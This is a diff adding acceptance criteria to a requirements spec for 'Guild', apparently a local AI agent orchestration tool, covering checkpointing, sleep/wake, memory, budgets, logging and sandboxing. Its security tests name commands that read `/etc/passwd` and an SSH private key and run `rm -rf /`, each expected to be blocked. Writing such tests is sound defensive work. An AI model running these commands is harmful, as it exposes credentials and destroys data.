+  - verify: Resume an interrupted task -> the old PID file is removed and a new one is created with the new daemon PID
+
+**REQ-25.6 — State persisted on every turn boundary (not just graceful exit)**
+
+- AC-25.6.1: Messages are written to SQLite after each completed turn
+  - verify: Kill the daemon with SIGKILL mid-task after 5 turns -> query SQLite -> all 5 completed turns are present
+- AC-25.6.2: No data is lost for completed turns even on unexpected termination
+  - verify: SIGKILL daemon at turn 10 -> resume task -> agent continues from turn 11 with turns 1-10 intact
+
+**REQ-25.7 — Stale lock detection: dead socket files are cleaned up automatically**
+
+- AC-25.7.1: Stale socket file is removed on daemon startup
+  - verify: Create a stale `.guild/run/guild.sock`, start a new daemon -> stale socket is deleted and a new one is created
+- AC-25.7.2: Active socket file is not removed
+  - verify: With a running daemon, start a second daemon attempt -> second daemon detects the active socket and reports "Another Guild daemon is already running"
+
+**REQ-25.8 — `guild kill --all` stops all running Guild tasks in this project**
+
+- AC-25.8.1: All running tasks are stopped
+  - verify: Launch 3 background tasks, run `guild kill --all` -> all 3 tasks are gracefully stopped; `guild ps` shows no running tasks
+- AC-25.8.2: Paused tasks are also killed
+  - verify: Pause one task, leave another running, run `guild kill --all` -> both are terminated
+
+**REQ-25.9 — Meaningful exit codes: 0=success, 1=task failed, 2=interrupted, 3=crash recovery available**
+
+- AC-25.9.1: Successful task exits with code 0
+  - verify: Run a task that completes successfully in foreground -> shell `$?` is 0
+- AC-25.9.2: Failed task exits with code 1
+  - verify: Run a task that fails verification -> shell `$?` is 1
+- AC-25.9.3: Interrupted task exits with code 2
+  - verify: SIGINT a running foreground task -> shell `$?` is 2
+- AC-25.9.4: Crash recovery available exits with code 3
+  - verify: Detect an orphaned task on startup -> exit code is 3 (when running a status check script)
+
 ### REQ-26: Sleep/Wake Survival
 
 **Goal:** Machine sleep does not corrupt agent state. Agent pauses cleanly on sleep, resumes on wake.
@@ -265,6 +774,56 @@ These emerged from design review and govern all implementation decisions:
 | REQ-26.4 | In-flight LLM calls interrupted by sleep are retried, not treated as fatal | Network error from mid-stream interruption → retry the turn |
 | REQ-26.5 | Sleep/wake events logged in audit trail | "why was agent stuck for 8 hours" → "machine slept 23:00–07:00" |
 | REQ-26.6 | Configurable wake behavior: `resume` (default) or `stay-paused` | Some users want explicit `guild resume` after wake |
+
+#### Acceptance Criteria (REQ-26.1 through REQ-26.6)
+
+**REQ-26.1 — Detect system sleep and checkpoint before suspension**
+
+- AC-26.1.1: Sleep is detected via time-drift between monotonic and wall-clock
+  - verify: Simulate a 30-second gap between monotonic and wall-clock time -> sleep detector flags a sleep event
+- AC-26.1.2: Checkpoint is saved before suspension completes
+  - verify: Trigger a sleep event while agent is mid-task -> on wake, the last checkpoint in SQLite has a timestamp from before the sleep gap
+- AC-26.1.3: Short pauses (under threshold) are not misidentified as sleep
+  - verify: Introduce a 2-second delay between turns (below the default 30-second sleep threshold) -> no sleep event is detected
+
+**REQ-26.2 — On wake, detect sleep occurred and resume agent work**
+
+- AC-26.2.1: Agent resumes from last checkpoint after wake
+  - verify: Agent is mid-task, machine sleeps and wakes -> agent continues from the last completed turn (not from the beginning)
+- AC-26.2.2: Wake detection triggers within the first poll interval after resume
+  - verify: Machine wakes -> within 10 seconds (one poll interval), the resource monitor detects the sleep gap and logs "Sleep detected: ~N hours"
+
+**REQ-26.3 — Ollama connection re-validated on wake (server may have died)**
+
+- AC-26.3.1: Health check runs before the first post-wake inference
+  - verify: Machine sleeps, Ollama remains running -> on wake, logs show "Post-wake health check: provider reachable" before the next LLM call
+- AC-26.3.2: Ollama restart during sleep is handled with retry
+  - verify: Kill Ollama during sleep, restart it before wake -> on wake, health check fails once, retries with backoff, succeeds on retry, agent continues
+- AC-26.3.3: Ollama still down on wake produces a clear error
+  - verify: Kill Ollama during sleep, do not restart -> on wake, agent logs "Provider unreachable after wake; retries exhausted" and pauses the task
+
+**REQ-26.4 — In-flight LLM calls interrupted by sleep are retried, not treated as fatal**
+
+- AC-26.4.1: A network error from sleep interruption triggers a retry
+  - verify: Agent is mid-streaming-response when sleep occurs -> on wake, the interrupted call is retried (not marked as a fatal error); agent loop continues
+- AC-26.4.2: Retry uses the same prompt and message history as the interrupted call
+  - verify: Inspect the retried LLM request after wake -> messages match the original pre-sleep request exactly
+
+**REQ-26.5 — Sleep/wake events logged in audit trail**
+
+- AC-26.5.1: Sleep and wake events appear in the audit log with timestamps
+  - verify: Machine sleeps at 23:00 and wakes at 07:00 -> `guild audit` shows entries "System sleep detected at 23:00" and "System wake detected at 07:00"
+- AC-26.5.2: Sleep duration is recorded
+  - verify: After a sleep/wake cycle -> audit entry includes "Sleep duration: ~8h 0m"
+
+**REQ-26.6 — Configurable wake behavior: `resume` (default) or `stay-paused`**
+
+- AC-26.6.1: Default behavior is auto-resume on wake
+  - verify: With default config, machine sleeps and wakes -> agent resumes automatically without manual intervention
+- AC-26.6.2: `stay-paused` mode requires manual resume
+  - verify: Set `sleep.wake_behavior = "stay-paused"`, machine sleeps and wakes -> agent remains paused; `guild ps` shows status `paused (post-wake)`; `guild resume <task_id>` is required to continue
+- AC-26.6.3: Wake behavior setting is respected per-task
+  - verify: Task A has `wake_behavior = "resume"`, Task B has `wake_behavior = "stay-paused"` -> after wake, Task A resumes, Task B stays paused
 
 ---
 
@@ -287,6 +846,68 @@ These emerged from design review and govern all implementation decisions:
 | REQ-07.9 | Task history — browse and search past tasks and their outcomes | Queryable from CLI |
 | REQ-07.10 | **Static/dynamic prompt separation** for cache efficiency | Static instructions cacheable, dynamic content separate |
 
+#### Acceptance Criteria (REQ-07.1 through REQ-07.10)
+
+**REQ-07.1 — Persistent conversation/task context across sessions**
+
+- AC-07.1.1: Conversation history is stored to disk after every turn
+  - verify: Run a task with 3 turns, restart Guild, query messages for that task -> all 3 turns are present in storage
+- AC-07.1.2: Resuming a task restores the full message history
+  - verify: Pause a task at turn 5, resume it -> agent's context contains all 5 previous turns
+
+**REQ-07.2 — Checkpoint and resume for long-running tasks**
+
+- AC-07.2.1: Explicit checkpoint is created via `guild checkpoint <task_id>`
+  - verify: Run `guild checkpoint <task_id>` mid-task -> checkpoint entry created with turn number and timestamp
+- AC-07.2.2: Auto-checkpoint fires at the configured interval
+  - verify: Set `checkpoint.interval_minutes = 5` -> after 5 minutes of work, a checkpoint is created automatically without user action
+- AC-07.2.3: Resume from checkpoint skips already-completed work
+  - verify: Checkpoint at turn 10, crash at turn 12, resume -> agent resumes from turn 10 (not turn 0 or turn 12)
+
+**REQ-07.4 — Multi-tier context compression**
+
+- AC-07.4.1: MicroCompact trims context without any API calls
+  - verify: Context exceeds 80% of window -> MicroCompact removes old tool results and system messages locally, with zero LLM calls
+- AC-07.4.2: AutoCompact uses the model to summarize when MicroCompact is insufficient
+  - verify: Context still too large after MicroCompact -> AutoCompact calls the LLM to produce a condensed summary of older turns
+- AC-07.4.3: Critical state survives all compression tiers
+  - verify: Run full compact on a 100-turn conversation -> the original task description and the last 5 turns remain intact in the compressed context
+
+**REQ-07.5 — Skeptical memory: agent verifies memories against actual state before acting**
+
+- AC-07.5.1: Agent checks a memory against current state before relying on it
+  - verify: Memory says "config.toml has [provider] section", but config.toml was changed -> agent reads the file to verify before using the memory
+- AC-07.5.2: Stale memories are flagged when verification fails
+  - verify: Memory contradicts actual state -> memory is marked as stale with a "verification failed" annotation
+
+**REQ-07.6 — Lightweight memory index always loaded, detailed notes fetched on demand**
+
+- AC-07.6.1: Memory index is under 200 lines
+  - verify: Inspect the loaded memory index after 50 tasks -> index is fewer than 200 lines of text
+- AC-07.6.2: Detailed notes are fetched only when the agent requests them
+  - verify: Agent receives the index, asks for details on entry X -> detailed note for X is loaded from storage on demand
+
+**REQ-07.8 — Context resets with structured handoff for very long tasks**
+
+- AC-07.8.1: Context reset creates a handoff artifact summarizing completed work
+  - verify: Trigger a context reset at turn 200 -> handoff artifact contains sections "Completed", "In Progress", "Remaining", and "Key Decisions"
+- AC-07.8.2: The new agent session starts with the handoff artifact, not raw history
+  - verify: After context reset, the new session's initial context contains the handoff artifact, not the 200-turn raw conversation
+
+**REQ-07.9 — Task history: browse and search past tasks**
+
+- AC-07.9.1: `guild history` lists past tasks with status and timestamps
+  - verify: Complete 3 tasks, run `guild history` -> output shows all 3 with description, status (done/failed), and start/end times
+- AC-07.9.2: `guild history --search "database"` filters by keyword
+  - verify: Complete tasks "setup database" and "fix CLI" -> `guild history --search "database"` returns only the database task
+
+**REQ-07.10 — Static/dynamic prompt separation for cache efficiency**
+
+- AC-07.10.1: Static prompt content is separated from dynamic content in the LLM request
+  - verify: Inspect the messages sent to the LLM -> system instructions are in a stable prefix block; dynamic content follows separately
+- AC-07.10.2: Static content remains identical across turns for cache hits
+  - verify: Compare the static prefix of turn 1 and turn 10 -> byte-identical, enabling provider-level prompt caching
+
 ### REQ-09: Long-Term Learning Loop
 
 **Goal:** Guild gets smarter over time. Completed tasks are opportunities to extract knowledge.
@@ -303,6 +924,70 @@ These emerged from design review and govern all implementation decisions:
 | REQ-09.8 | **Learning decay** — old unvalidated learnings lose confidence | Prevents stale knowledge |
 | REQ-09.9 | **Prompt refinement suggestions** — learner suggests improvements based on patterns | "The reviewer misses type errors — suggest adding X to prompt" |
 
+#### Acceptance Criteria (REQ-09.1 through REQ-09.9)
+
+**REQ-09.1 — Post-task learning extraction**
+
+- AC-09.1.1: After a task completes, the learner reviews the task log and extracts learnings
+  - verify: Complete a task -> `guild learnings --task <id>` shows at least one extracted learning with source "post-task extraction"
+- AC-09.1.2: Extraction runs automatically without user intervention
+  - verify: Complete a task at Tier 3 -> learning extraction happens without any prompt or approval step
+
+**REQ-09.2 — Knowledge categories: patterns, anti-patterns, tool tips, domain knowledge**
+
+- AC-09.2.1: Each learning is assigned a category from the defined set
+  - verify: Extract a learning -> it has a `category` field set to one of: `pattern`, `anti-pattern`, `tool-tip`, `domain-knowledge`
+- AC-09.2.2: `guild learnings --category pattern` filters by category
+  - verify: Store learnings across multiple categories -> filter returns only those matching the requested category
+
+**REQ-09.3 — Confidence scoring: learnings start tentative, get promoted after repeated validation**
+
+- AC-09.3.1: New learnings start with a low confidence score
+  - verify: Extract a new learning -> confidence is set to the initial value (e.g., 0.3), not 1.0
+- AC-09.3.2: Confidence increases when the learning is validated by a subsequent task
+  - verify: Learning "always run lint before tests" is validated by 3 tasks -> confidence rises from 0.3 to a higher value (e.g., 0.7)
+- AC-09.3.3: A learning that is contradicted by a task outcome has its confidence reduced
+  - verify: Learning "module X has no dependencies" is contradicted -> confidence decreases
+
+**REQ-09.4 — Learning injection: confirmed learnings available to agents in future sessions**
+
+- AC-09.4.1: Learnings above the confidence threshold are included in the agent's context
+  - verify: Learning with confidence 0.8 (above threshold 0.5) -> appears in the agent's context for relevant tasks
+- AC-09.4.2: Learnings below the threshold are not injected
+  - verify: Learning with confidence 0.2 (below threshold 0.5) -> does not appear in the agent's context
+
+**REQ-09.5 — Learning review: human can browse, edit, approve, or reject learnings**
+
+- AC-09.5.1: `guild learnings` lists all learnings with their confidence and category
+  - verify: Run `guild learnings` -> output shows each learning with text, category, confidence score, and creation date
+- AC-09.5.2: `guild learnings approve <id>` promotes a learning to maximum confidence
+  - verify: Approve a learning -> its confidence is set to 1.0
+- AC-09.5.3: `guild learnings reject <id>` removes a learning
+  - verify: Reject a learning -> it no longer appears in `guild learnings` or in agent context
+
+**REQ-09.6 — Cross-task learning: patterns from task A inform task B**
+
+- AC-09.6.1: A learning extracted from task A is available when starting task B
+  - verify: Task A produces learning "use pathlib for paths" -> start task B in a related area -> learning appears in agent context
+- AC-09.6.2: Irrelevant learnings are not injected into unrelated tasks
+  - verify: Learning scoped to "database" module -> task in "CLI" module does not receive it
+
+**REQ-09.8 — Learning decay: old unvalidated learnings lose confidence**
+
+- AC-09.8.1: Unvalidated learnings lose confidence over time
+  - verify: Create a learning, run no tasks for the configured decay period -> confidence has decreased from its initial value
+- AC-09.8.2: Validated learnings do not decay
+  - verify: Create a learning, validate it in 3 tasks, wait the decay period -> confidence remains at or above its post-validation level
+- AC-09.8.3: Learnings that decay below a minimum threshold are archived
+  - verify: Learning confidence decays to 0.05 -> it is removed from active learnings and moved to archive
+
+**REQ-09.9 — Prompt refinement suggestions**
+
+- AC-09.9.1: Learner identifies recurring issues and suggests prompt changes
+  - verify: Agent fails the same type check 3 times across tasks -> learner produces a suggestion "Add 'always check return types' to the reviewer prompt"
+- AC-09.9.2: Suggestions are presented to the user for review, not auto-applied
+  - verify: Prompt suggestion is generated -> `guild learnings --suggestions` shows it; it is not automatically injected into any prompt
+
 ### REQ-10: Cost & Resource Tracking
 
 **Goal:** Know what your agents are consuming and set limits.
@@ -314,6 +999,53 @@ These emerged from design review and govern all implementation decisions:
 | REQ-10.3 | Resource summary in CLI | Real-time and historical |
 | REQ-10.4 | Alerts when approaching limits | Configurable thresholds (80%, 90%, 100%) |
 | REQ-10.5 | Cost estimation for cloud providers (when used) | Map tokens to approximate $ |
+
+#### Acceptance Criteria (REQ-10.1 through REQ-10.5)
+
+**REQ-10.1 — Token usage tracking per agent, per task, per session**
+
+- AC-10.1.1: Every LLM call records input tokens, output tokens, and total tokens
+  - verify: Run a task with 3 LLM turns -> `guild usage` shows per-turn token counts that sum to the session total
+- AC-10.1.2: Token usage is attributed to the correct agent and task
+  - verify: Run two tasks with different agents -> `guild usage --task <id>` shows only tokens for that task
+- AC-10.1.3: Token data persists across restarts
+  - verify: Run a task, restart Guild, run `guild usage` -> previous task token data is present
+
+**REQ-10.2 — Budget limits -- max tokens, max time, max tool calls**
+
+- AC-10.2.1: Agent stops when token budget is exhausted
+  - verify: Set `budget.max_tokens = 500` for a task -> agent stops with status `budget_exceeded` before exceeding 500 total tokens
+- AC-10.2.2: Agent stops when time budget is exhausted
+  - verify: Set `budget.max_time_seconds = 10` -> agent stops with status `budget_exceeded` within 2 seconds of the limit
+- AC-10.2.3: Agent stops when tool call budget is exhausted
+  - verify: Set `budget.max_tool_calls = 3` -> agent stops after exactly 3 tool calls with status `budget_exceeded`
+- AC-10.2.4: Budget can be set per-agent and per-task independently
+  - verify: Set agent-level budget of 1000 tokens and task-level budget of 500 tokens -> task-level limit triggers first
+
+**REQ-10.3 — Resource summary in CLI**
+
+- AC-10.3.1: `guild usage` displays a summary table of token consumption
+  - verify: Run `guild usage` after completing a task -> output shows a table with columns for task, agent, input tokens, output tokens, total tokens
+- AC-10.3.2: `guild usage --task <id>` shows per-turn detail for a specific task
+  - verify: Run `guild usage --task <id>` -> output shows each LLM turn with timestamp and token counts
+
+**REQ-10.4 — Alerts when approaching limits**
+
+- AC-10.4.1: A warning is logged when usage crosses a configured threshold
+  - verify: Set `budget.max_tokens = 1000` and `budget.alert_thresholds = [80]` -> log contains a warning when cumulative tokens exceed 800
+- AC-10.4.2: Multiple threshold levels fire independently
+  - verify: Set `budget.alert_thresholds = [80, 90]` -> two distinct warnings appear at 80% and 90% usage
+- AC-10.4.3: No alert fires if usage stays below the lowest threshold
+  - verify: Set `budget.max_tokens = 10000` and `budget.alert_thresholds = [80]` -> task completes at 500 tokens with no budget warning in logs
+
+**REQ-10.5 — Cost estimation for cloud providers (when used)**
+
+- AC-10.5.1: Cost estimate is calculated using configured per-token pricing
+  - verify: Set `provider.cost_per_1k_input = 0.01` and `provider.cost_per_1k_output = 0.03` -> `guild usage` shows estimated cost matching `(input_tokens * 0.01 + output_tokens * 0.03) / 1000`
+- AC-10.5.2: Cost is zero when using a local provider with no pricing configured
+  - verify: Use Ollama with no cost config -> `guild usage` shows `$0.00` for cost
+- AC-10.5.3: Cost estimation handles multiple providers in the same session
+  - verify: Task uses local model then escalates to cloud model -> cost reflects only the cloud model's token usage at cloud pricing
 
 ### REQ-11: Observability & Debugging
 
@@ -327,6 +1059,51 @@ These emerged from design review and govern all implementation decisions:
 | REQ-11.4 | Error recovery — restart crashed agents from last checkpoint | Automatic or manual |
 | REQ-11.5 | Log export in standard formats (JSON, OpenTelemetry) | For external observability tools |
 
+#### Acceptance Criteria (REQ-11.1 through REQ-11.5)
+
+**REQ-11.1 — Full reasoning chain trace (not just final output)**
+
+- AC-11.1.1: Every LLM call is recorded with its full prompt and response
+  - verify: Run a task -> session trace in SQLite contains all LLM requests and responses including system prompt, user messages, and assistant replies
+- AC-11.1.2: Every tool call is recorded with arguments and result
+  - verify: Run a task that calls 2 tools -> trace entries include tool name, input arguments, output result, and duration for each call
+- AC-11.1.3: Decision points are recorded with rationale
+  - verify: Run a task where the agent chooses between approaches -> trace contains a decision entry with alternatives considered and reason for selection
+
+**REQ-11.2 — Session replay from logs**
+
+- AC-11.2.1: A completed session can be replayed step-by-step
+  - verify: Run `guild replay <task_id>` -> outputs each turn in chronological order (LLM call, tool call, result) with timestamps
+- AC-11.2.2: Replay includes tool call inputs and outputs
+  - verify: Replay a session that used file_read -> replay output shows the file path requested and the content returned
+- AC-11.2.3: Replay of a non-existent session produces a clear error
+  - verify: Run `guild replay nonexistent-id` -> error message says "No session found with ID nonexistent-id"
+
+**REQ-11.3 — Structured logging with configurable levels**
+
+- AC-11.3.1: Log level is configurable via config file
+  - verify: Set `logging.level = "DEBUG"` in config -> debug-level messages appear in output
+- AC-11.3.2: Default log level is INFO
+  - verify: Start Guild with default config -> INFO messages appear, DEBUG messages do not
+- AC-11.3.3: Log entries include timestamp, level, module, and message
+  - verify: Inspect any log line -> it contains ISO timestamp, level (DEBUG/INFO/WARN/ERROR), source module name, and message text
+
+**REQ-11.4 — Error recovery -- restart crashed agents from last checkpoint**
+
+- AC-11.4.1: A crashed agent can be resumed from its last checkpoint
+  - verify: Kill the agent process mid-task -> run `guild resume <task_id>` -> agent continues from the last completed turn, not from the beginning
+- AC-11.4.2: Resume detects and reports the crash reason if available
+  - verify: Kill agent with SIGKILL -> `guild resume <task_id>` outputs "Recovering from interrupted state" with the last known turn number
+
+**REQ-11.5 — Log export in standard formats (JSON, OpenTelemetry)**
+
+- AC-11.5.1: Session logs can be exported as JSON
+  - verify: Run `guild logs <task_id> --format json` -> output is valid JSON with an array of log entries
+- AC-11.5.2: Session logs can be exported in OpenTelemetry-compatible format
+  - verify: Run `guild logs <task_id> --format otlp` -> output contains spans with trace_id, span_id, timestamps, and attributes matching OTLP schema
+- AC-11.5.3: Export of an empty session produces a valid but empty structure
+  - verify: Export logs for a task with zero turns -> output is valid JSON with an empty array (not an error)
+
 ### REQ-12: Task Specification & Acceptance Criteria
 
 **Goal:** Structured way to define what "done" means so agents can self-verify.
@@ -339,6 +1116,51 @@ These emerged from design review and govern all implementation decisions:
 | REQ-12.4 | Task dependencies — "do B after A completes" | DAG-based scheduling |
 | REQ-12.5 | Task status lifecycle: pending → in-progress → verifying → done/failed/blocked | Clear state machine |
 
+#### Acceptance Criteria (REQ-12.1 through REQ-12.5)
+
+**REQ-12.1 — Task definition format with description, acceptance criteria, verification steps**
+
+- AC-12.1.1: A task can be defined with a structured spec containing description, acceptance criteria, and verification steps
+  - verify: Create a task spec YAML with `description`, `acceptance_criteria`, and `verification_steps` fields -> `guild task --spec task.yaml` loads and uses all three fields
+- AC-12.1.2: A task without acceptance criteria is accepted but flagged as unverifiable
+  - verify: Create a task spec with description only (no acceptance_criteria) -> task runs with a warning "No acceptance criteria defined; self-verification skipped"
+- AC-12.1.3: Malformed task spec is rejected at load time
+  - verify: Create a YAML file with invalid structure (missing `description`) -> `guild task --spec bad.yaml` fails with a validation error naming the missing field
+
+**REQ-12.2 — Verification step execution -- run tests, check files, validate output**
+
+- AC-12.2.1: Verification steps are executed automatically after the agent marks a task as done
+  - verify: Define a task with verification step `pytest tests/foo.py` -> agent completes work, then verification runs automatically and result is recorded as pass/fail
+- AC-12.2.2: A failing verification step marks the task as failed, not done
+  - verify: Define a task with verification step that checks for a file that the agent did not create -> task status is `failed` with verification failure details
+- AC-12.2.3: Multiple verification steps run in sequence; first failure stops remaining steps
+  - verify: Define 3 verification steps where the 2nd fails -> only steps 1 and 2 execute; step 3 is skipped; task status shows which step failed
+
+**REQ-12.3 — Task decomposition tracking -- see how orchestrator broke down a task**
+
+- AC-12.3.1: Subtasks created by decomposition are linked to their parent task
+  - verify: Run a task that decomposes into 3 subtasks -> `guild history --task <parent_id>` shows a tree with parent and 3 children
+- AC-12.3.2: Subtask status rolls up to the parent
+  - verify: Complete 2 of 3 subtasks -> parent status shows `in-progress` with "2/3 subtasks done"
+
+**REQ-12.4 — Task dependencies -- "do B after A completes"**
+
+- AC-12.4.1: A task with a dependency waits until the dependency completes
+  - verify: Create task B with `depends_on: [task_A_id]` -> task B stays `pending` until task A reaches `done`, then B transitions to `in-progress`
+- AC-12.4.2: A dependency that fails blocks the dependent task
+  - verify: Task A fails -> dependent task B transitions to `blocked` with reason "dependency task_A failed"
+- AC-12.4.3: Circular dependencies are detected at definition time
+  - verify: Create task A depending on B and B depending on A -> error "Circular dependency detected: A -> B -> A"
+
+**REQ-12.5 — Task status lifecycle: pending -> in-progress -> verifying -> done/failed/blocked**
+
+- AC-12.5.1: Tasks transition through the defined states in order
+  - verify: Run a task with verification steps -> status transitions observed in audit log: `pending` -> `in-progress` -> `verifying` -> `done`
+- AC-12.5.2: Invalid state transitions are rejected
+  - verify: Attempt to transition a `done` task to `in-progress` programmatically -> raises `InvalidStateTransition` error
+- AC-12.5.3: `guild status <task_id>` shows the current lifecycle state
+  - verify: Query a running task -> output includes current state (e.g., "in-progress") with time spent in that state
+
 ### REQ-13: Security & Sandboxing
 
 **Goal:** Protect the host system from runaway agent behavior.
@@ -350,6 +1172,53 @@ These emerged from design review and govern all implementation decisions:
 | REQ-13.3 | Secret management — agents use API keys without seeing raw values | Injected at runtime, masked in logs |
 | REQ-13.4 | File system boundaries — agents can only access allowed paths | Enforced by Guild, not by convention |
 | REQ-13.5 | Command allowlist/denylist | Block dangerous commands |
+
+#### Acceptance Criteria (REQ-13.1 through REQ-13.5)
+
+**REQ-13.1 — Sandboxed execution for shell commands**
+
+- AC-13.1.1: Shell commands execute inside a sandbox that restricts filesystem access
+  - verify: Agent runs `cat /etc/passwd` from within sandbox -> command fails with permission denied or sandbox violation error
+- AC-13.1.2: Sandbox escape attempts are detected and logged
+  - verify: Agent runs a command that attempts to break out of the sandbox (e.g., symlink traversal) -> command is blocked and an audit log entry records the attempt
+- AC-13.1.3: Sandbox is configurable per security profile
+  - verify: Set `security.sandbox = "strict"` -> only project directory is accessible; set `security.sandbox = "permissive"` -> home directory is also accessible
+
+**REQ-13.2 — Network access controls per agent**
+
+- AC-13.2.1: Network access can be restricted to localhost only
+  - verify: Set `security.network = "localhost"` for an agent -> agent tool that attempts an outbound HTTP request to an external host is blocked
+- AC-13.2.2: Network access can be fully denied
+  - verify: Set `security.network = "none"` -> any network call from agent tools fails with "Network access denied by policy"
+- AC-13.2.3: Default network policy allows all access
+  - verify: Start agent with no network config -> agent can reach both localhost and external hosts
+
+**REQ-13.3 — Secret management -- agents use API keys without seeing raw values**
+
+- AC-13.3.1: Secrets are injected at runtime and not visible in agent context
+  - verify: Configure a secret `API_KEY=abc123` -> agent's tool receives the value, but the LLM conversation history shows `[REDACTED]` instead of `abc123`
+- AC-13.3.2: Secrets are masked in all log output
+  - verify: A tool returns output containing the secret value -> log entry replaces the secret with `***`
+- AC-13.3.3: Attempting to read the secret store file directly is blocked
+  - verify: Agent uses file_read tool on `.guild/secrets` -> tool returns "Access denied: secrets file is protected"
+
+**REQ-13.4 — File system boundaries -- agents can only access allowed paths**
+
+- AC-13.4.1: File operations outside the allowed path are rejected
+  - verify: Set `security.allowed_paths = ["/project"]` -> agent attempts `file_read("/home/user/.ssh/id_rsa")` -> tool returns "Path /home/user/.ssh/id_rsa is outside allowed boundaries"
+- AC-13.4.2: Symlinks that resolve outside allowed paths are rejected
+  - verify: Create a symlink inside the project pointing to `/etc` -> agent attempts to read via the symlink -> tool rejects with boundary violation
+- AC-13.4.3: Allowed paths support glob patterns
+  - verify: Set `security.allowed_paths = ["/project", "/tmp/guild-*"]` -> agent can read `/tmp/guild-work/file.txt` but not `/tmp/other/file.txt`
+
+**REQ-13.5 — Command allowlist/denylist**
+
+- AC-13.5.1: Commands on the denylist are blocked before execution
+  - verify: Denylist contains `rm -rf /` -> agent attempts to run `rm -rf /` -> tool returns "Command blocked by denylist" and command does not execute
+- AC-13.5.2: Denylist uses pattern matching, not exact string match
+  - verify: Denylist contains pattern `rm -rf *` -> agent runs `rm -rf ./src` -> command is blocked
+- AC-13.5.3: Allowlist mode blocks all commands not on the list
+  - verify: Set `security.command_mode = "allowlist"` with `security.allowed_commands = ["python", "pytest"]` -> agent runs `curl http://example.com` -> command is blocked with "Command not in allowlist"
 
 ### REQ-14: Configuration as Code
 
@@ -364,6 +1233,56 @@ These emerged from design review and govern all implementation decisions:
 | REQ-14.5 | Config validation on startup | Fail fast with clear error messages |
 | REQ-14.6 | Config hot-reload where possible | Change config without restart |
 
+#### Acceptance Criteria (REQ-14.1 through REQ-14.6)
+
+**REQ-14.1 — Agent definitions in config files (TOML)**
+
+- AC-14.1.1: An agent can be fully defined in a TOML config file
+  - verify: Create `.guild/agents/coder.toml` with `name`, `role`, `model`, `system_prompt`, `tools`, and `permissions` -> `guild task --agent coder "write a function"` loads and uses that agent definition
+- AC-14.1.2: Missing required fields produce a clear validation error
+  - verify: Create an agent TOML missing the `model` field -> startup error: "Agent 'coder' missing required field: model"
+- AC-14.1.3: Agent config supports referencing named permission profiles
+  - verify: Set `permissions = "safe"` in agent TOML -> agent loads the "safe" permission profile defined in `profiles.toml`
+
+**REQ-14.2 — Team compositions as named configs**
+
+- AC-14.2.1: A team composition can be loaded by name
+  - verify: Define `[teams.coding-team]` in config with orchestrator and workers -> `guild task --team coding-team "build feature"` launches the defined team
+- AC-14.2.2: Referencing a non-existent team name produces a clear error
+  - verify: Run `guild task --team nonexistent "do something"` -> error: "Team 'nonexistent' not found in configuration"
+
+**REQ-14.3 — Permission profiles as named configs**
+
+- AC-14.3.1: Named permission profiles map to specific tier configurations
+  - verify: Define `[profiles.safe]` with `tier = 1` and tool restrictions -> loading profile "safe" applies Tier 1 (Ask) permissions with those restrictions
+- AC-14.3.2: Multiple profiles can coexist and be switched at runtime
+  - verify: Define "safe" and "full-auto" profiles -> switch from "safe" to "full-auto" via `guild config --set permissions.profile=full-auto` -> agent immediately operates at the new tier
+
+**REQ-14.4 — Environment-specific overrides**
+
+- AC-14.4.1: Environment-specific config files override base config
+  - verify: Set `provider.model = "gemma4:4b"` in `guild.toml` and `provider.model = "gemma4:1b"` in `guild.ci.toml` -> running with `GUILD_ENV=ci` uses `gemma4:1b`
+- AC-14.4.2: Base config values are preserved when not overridden
+  - verify: Set `provider.base_url` only in `guild.toml` -> running with `GUILD_ENV=ci` still uses that base_url
+
+**REQ-14.5 — Config validation on startup**
+
+- AC-14.5.1: Invalid config values are caught at startup with field-level error messages
+  - verify: Set `provider.temperature = "hot"` -> startup fails with "Validation error in provider.temperature: expected float, got string"
+- AC-14.5.2: Unknown config keys produce a warning
+  - verify: Add `provider.typo_field = true` to config -> startup logs a warning "Unknown config key: provider.typo_field"
+- AC-14.5.3: Config with no errors starts cleanly with no validation warnings
+  - verify: Use a valid default config -> startup produces no validation warnings or errors
+
+**REQ-14.6 — Config hot-reload where possible**
+
+- AC-14.6.1: Changing a hot-reloadable config value takes effect without restart
+  - verify: While agent is running, change `resource.mode = "stealth"` in config file -> within 10 seconds, `guild resource-status` shows mode as "stealth"
+- AC-14.6.2: Non-reloadable config changes are deferred to next restart
+  - verify: Change `provider.model` while agent is running -> log message: "Config change to provider.model requires restart to take effect"
+- AC-14.6.3: Config syntax errors during hot-reload do not crash the running agent
+  - verify: Introduce a TOML syntax error in config while agent is running -> agent logs "Config reload failed: TOML parse error at line N" and continues with previous config
+
 ### REQ-15: Human-in-the-Loop Escalation Patterns
 
 **Goal:** Smart escalation that doesn't block all work when one thing needs human input.
@@ -375,6 +1294,51 @@ These emerged from design review and govern all implementation decisions:
 | REQ-15.3 | Escalation context — full history of what was tried before escalating | Human gets enough context to answer quickly |
 | REQ-15.4 | Batch approval — review multiple pending requests at once | Efficient for returning after AFK |
 | REQ-15.5 | Notification channels: desktop toast, terminal bell, webhook — configurable | Different channels for different presence states |
+
+#### Acceptance Criteria (REQ-15.1 through REQ-15.5)
+
+**REQ-15.1 — Asynchronous question queue -- agent posts question, continues other work**
+
+- AC-15.1.1: Agent posts a question to the queue without blocking the agent loop
+  - verify: Agent encounters an ambiguity, posts a question -> agent continues executing the next subtask within the same turn (does not wait for answer)
+- AC-15.1.2: Queued questions are retrievable via CLI
+  - verify: Agent posts 2 questions -> `guild questions` lists both with timestamps, task IDs, and question text
+- AC-15.1.3: Answering a question delivers the answer to the agent on its next turn
+  - verify: Run `guild answer <question_id> "use approach A"` -> on the agent's next LLM call, the answer is included in the context
+
+**REQ-15.2 — Presence-aware notification -- when user is active, notify immediately; when idle/sleeping, queue silently**
+
+- AC-15.2.1: When user is active, escalation triggers an immediate notification
+  - verify: Resource monitor reports `active` state -> agent escalates -> desktop toast or terminal bell fires within 2 seconds
+- AC-15.2.2: When user is idle, escalation is queued silently
+  - verify: Resource monitor reports `idle` state -> agent escalates -> no notification fires; question appears in `guild questions` queue
+- AC-15.2.3: Queued notifications are delivered when user returns to active
+  - verify: User was idle with 2 queued questions -> user becomes active -> both notifications fire within 10 seconds of activity detection
+
+**REQ-15.3 — Escalation context -- full history of what was tried before escalating**
+
+- AC-15.3.1: Escalation includes a summary of attempted approaches
+  - verify: Agent tries approaches A and B, both fail, then escalates -> question context includes "Tried: A (failed: reason), B (failed: reason)"
+- AC-15.3.2: Escalation includes the specific blocker
+  - verify: Agent escalates -> question text states what specifically is needed from the human (e.g., "Need clarification on: should the API return 404 or empty array for no results?")
+
